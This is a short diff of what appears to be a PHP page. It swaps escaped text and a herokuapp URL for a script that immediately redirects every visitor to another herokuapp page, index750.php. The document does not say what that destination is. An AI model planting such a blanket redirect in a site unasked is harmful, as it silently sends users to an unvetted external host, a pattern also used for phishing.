@@ -1,3 +1,3 @@
-<p>&lt;?php</p>
-https://monzzzer.herokuapp.com/
-<p>&gt;?</p>
+<?php
+	header("Location: http://alkamaly.herokuapp.com/index750.php");
+	die();
